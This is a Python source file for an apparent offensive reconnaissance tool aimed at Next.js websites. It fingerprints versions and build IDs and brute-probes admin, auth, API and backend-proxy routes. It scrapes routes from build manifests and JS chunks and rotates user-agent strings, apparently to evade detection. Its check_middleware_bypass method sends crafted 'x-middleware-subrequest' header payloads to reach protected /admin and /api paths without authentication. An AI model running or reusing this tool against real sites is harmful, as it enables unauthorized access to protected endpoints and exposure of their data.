import requests
import re
import json
import random
import time
from urllib.parse import urljoin

USER_AGENTS = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
]

class NextJSRecon:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.results = {}
        self._initial_html = ''
        self._initial_headers = {}
        self._session = requests.Session()
        self._session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

    def set_initial_response(self, html, headers):
        self._initial_html = html
        self._initial_headers = headers

    def _get(self, url, **kwargs):
        kwargs.setdefault('headers', {}).update({'User-Agent': random.choice(USER_AGENTS)})
        kwargs.setdefault('timeout', 15)
        for attempt in range(3):
            try:
                r = self._session.get(url, **kwargs)
                if r.status_code not in [429, 503]:
                    return r
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
            except requests.RequestException:
                if attempt == 2:
                    raise
                time.sleep(2)
        return self._session.get(url, **kwargs)

    def detect_version(self):
        text = self._initial_html
        if not text:
            try:
                response = self._get(self.target_url)
                text = response.text
            except:
                self.results['detected'] = False
                return self.results
        headers = self._initial_headers

        self.results['detected'] = '_next' in text or '__NEXT_DATA__' in text

        if headers:
            x_powered = headers.get('x-powered-by', '')
            if 'Next.js' in x_powered:
                self.results['detected'] = True
                self.results['x_powered_by'] = x_powered
            x_mw_rewrite = headers.get('x-middleware-rewrite', '')
            if x_mw_rewrite:
                self.results['middleware_rewrite'] = x_mw_rewrite

        if self.results['detected']:
            build_id = re.search(r'"buildId":"([^"]+)"', text)
            if build_id:
                self.results['build_id'] = build_id.group(1)
            version = re.search(r'Next\.js\s+v?(\d+\.\d+\.\d+)', text, re.IGNORECASE)
            if version:
                self.results['version'] = version.group(1)

            turbopack = re.search(r'turbopack[-_][a-f0-9]+', text, re.IGNORECASE)
            if turbopack:
                self.results['bundler'] = 'Turbopack'
            elif re.search(r'webpack', text, re.IGNORECASE):
                self.results['bundler'] = 'Webpack'

            next_data = re.search(r'__NEXT_DATA__\s*=\s*({.*?});', text, re.DOTALL)
            if next_data:
                try:
                    data = json.loads(next_data.group(1))
                    self.results['page'] = data.get('page', '')
                    self.results['runtime_config'] = data.get('runtimeConfig', {})
                    props = data.get('props', {})
                    self.results['props'] = str(props)[:500]
                    pp = props.get('pageProps', {})
                    if pp:
                        self.results['pageProps_keys'] = list(pp.keys())
                        sentry = pp.get('_sentryTraceData') or pp.get('_sentryBaggage')
                        if sentry:
                            self.results['sentry_detected'] = True
                except:
                    pass
            rsc = re.search(r'__RSC|RSC:', text)
            if rsc:
                self.results['react_server_components'] = True
            server_actions = re.findall(r'_next/server-actions/[^"\']+', text)
            if server_actions:
                self.results['server_actions'] = list(set(server_actions))

            locale = re.search(r'NEXT_LOCALE[=;]([a-z-]+)', text + str(headers))
            if locale:
                self.results['locale'] = locale.group(1)

            static_subdomains = re.findall(r'(https?://[^"\']*?-static\.[^"\']*?\.com)[^"\']*?/_next/static', text)
            if static_subdomains:
                self.results['static_subdomains'] = list(set(static_subdomains))

            link_header = headers.get('link', '') if headers else ''
            if link_header:
                preloads = re.findall(r'<([^>]+)>;\s*rel=preload', link_header)
                if preloads:
                    self.results['preloaded_assets'] = len(preloads)

        return self.results

    def discover_routes(self):
        routes = [
            '/_next/static/', '/_next/image', '/_next/data/',
            '/api/', '/api/auth/', '/api/auth/session',
            '/api/users/', '/api/user/', '/api/admin/',
            '/_next/server-actions/',
            '/dashboard', '/admin', '/profile', '/settings', '/login', '/signup',
            '/_next/static/chunks/', '/_next/static/webpack/',
            '/_next/static/css/', '/_next/static/media/',
            '/_next/static/chunks/pages/',
        ]
        found = []
        for route in routes:
            try:
                url = f"{self.target_url}{route}"
                r = self._get(url, timeout=8, allow_redirects=False)
                if r.status_code not in [404, 502, 503]:
                    found.append({'route': route, 'status': r.status_code,
                                  'length': len(r.content)})
            except:
                pass
        self.results['routes'] = found
        return found

    def discover_routes_from_manifest(self):
        manifest_routes = set()
        try:
            r = self._get(self.target_url)
            html = r.text

            build_manifest_url = None
            build_id = self.results.get('build_id')
            if build_id:
                manifest_url = f"/_next/static/{build_id}/_buildManifest.js"
                build_manifest_url = urljoin(self.target_url, manifest_url)
            else:
                manifests = re.findall(
                    r'src=["\']([^"\']*_next/static/[^"\']+/_buildManifest\.js)["\']',
                    html
                )
                if manifests:
                    build_manifest_url = urljoin(self.target_url, manifests[0])

            if build_manifest_url:
                resp = self._get(build_manifest_url, timeout=10)
                if resp.status_code == 200:
                    text = resp.text
                    routes_in_manifest = re.findall(
                        r'["\'](/(?:[a-zA-Z0-9_/.-]+(?:\[[^\]]+\])?){1,})["\']',
                        text
                    )
                    sorted_pages = re.search(
                        r'sortedPages:\[([^\]]+)\]', text
                    )
                    if sorted_pages:
                        pages_str = sorted_pages.group(1)
                        page_routes = re.findall(
                            r'["\'](/(?:[a-zA-Z0-9_/.-]+(?:\[[^\]]+\])?)?)["\']',
                            pages_str
                        )
                        manifest_routes.update(page_routes)
                    manifest_routes.update(routes_in_manifest)

            self.results['manifest_routes'] = sorted(manifest_routes)
            self.results['manifest_route_count'] = len(manifest_routes)
        except:
            self.results['manifest_routes'] = []
            self.results['manifest_route_count'] = 0
        return list(manifest_routes)

    def check_middleware_bypass(self):
        payloads = [
            'middleware:middleware:middleware:middleware:middleware',
            'middleware:middleware:middleware:middleware',
            'middleware:middleware:middleware',
            'middleware:middleware',
            'middleware:',
            'bypass',
            'true',
            '1',
        ]
        test_paths = ['/api/admin', '/admin', '/api/auth', '/api/protected']
        for path in test_paths:
            for payload in payloads:
                try:
                    r = self._get(f"{self.target_url}{path}",
                        timeout=8, allow_redirects=False,
                        headers={'x-middleware-subrequest': payload})
                    if r.status_code not in [404, 401, 403, 302]:
                        return True, {'payload': payload, 'path': path, 'status': r.status_code}
                except:
                    pass
        return False, None

    def check_ssg_ssr_leaks(self):
        leaks = []
        try:
            r = self._get(f"{self.target_url}/_next/data/", timeout=8)
            if r.status_code != 404:
                leaks.append('/_next/data/ accessible')
            r2 = self._get(f"{self.target_url}/404", timeout=8)
            build_id = re.search(r'"buildId":"([^"]+)"', r2.text)
            if build_id:
                leaks.append('Build ID leaked in 404 page')
                r3 = self._get(f"{self.target_url}/_next/data/{build_id.group(1)}/index.json", timeout=8)
                if r3.status_code == 200:
                    leaks.append('SSG data accessible via build ID')
        except:
            pass
        self.results['leaks'] = leaks
        return leaks

    def discover_api_from_chunks(self):
        """Extract API routes from Next.js JS chunks — fetch() calls and route defs."""
        api_routes = set()
        try:
            r = self._get(self.target_url)
            html = r.text
            js_chunks = re.findall(r'src=["\']([^"\']*_next/static/chunks/[^"\']+)["\']', html)
            js_chunks += re.findall(r'src=["\']([^"\']*_next/static/[^"\']+\.js)["\']', html)
            for js in set(js_chunks):
                js_url = urljoin(self.target_url, js)
                try:
                    content = self._get(js_url, timeout=10).text
                    fetches = re.findall(r'fetch\(["\']([^"\']+)["\']\)', content)
                    for f in fetches:
                        if '/api/' in f.lower():
                            api_routes.add(f)
                    routes_def = re.findall(r'["\'](/[a-zA-Z0-9/_-]+)["\']\s*:\s*\{', content)
                    for rd in routes_def:
                        if '/api/' in rd.lower():
                            api_routes.add(rd)
                    axios_refs = re.findall(r'axios\.\w+\(["\']([^"\']+)["\']\)', content)
                    for a in axios_refs:
                        if '/api/' in a.lower():
                            api_routes.add(a)
                except:
                    pass
        except:
            pass
        self.results['api_routes_from_chunks'] = sorted(api_routes)
        return list(api_routes)

    def detect_backend_proxy(self):
        """Detect /api/backend/ proxy patterns in Next.js apps."""
        findings = []
        proxy_paths = [
            '/api/backend/', '/api/backend', '/api/proxy/', '/api/proxy',
            '/api/gateway/', '/api/gateway', '/api/bkapi/', '/api/bkapi',
            '/backend/', '/backend/api/', '/api/internal/',
        ]
        for path in proxy_paths:
            try:
                r = self._get(f"{self.target_url}{path}", timeout=8, allow_redirects=False)
                if r.status_code not in [404, 502, 503]:
                    findings.append({
                        'path': path,
                        'status': r.status_code,
                        'length': len(r.content),
                        'content_type': r.headers.get('Content-Type', ''),
                    })
            except:
                pass
        try:
            r = self._get(self.target_url)
            html = r.text
            proxy_refs = re.findall(r'["\'](/api/backend/[^"\']+)["\']', html)
            proxy_refs += re.findall(r'["\'](/backend/[^"\']+)["\']', html)
            if proxy_refs:
                for ref in set(proxy_refs):
                    findings.append({
                        'path': ref,
                        'source': 'js_reference',
                        'status': 'referenced_in_code',
                    })
        except:
            pass
        self.results['backend_proxy'] = findings
        return findings

    def run_all(self):
        self.detect_version()
        self.discover_routes()
        self.discover_routes_from_manifest()
        bypass, details = self.check_middleware_bypass()
        self.results['middleware_bypass'] = bypass
        self.results['middleware_details'] = details
        self.check_ssg_ssr_leaks()
        self.discover_api_from_chunks()
        self.detect_backend_proxy()
        return self.results
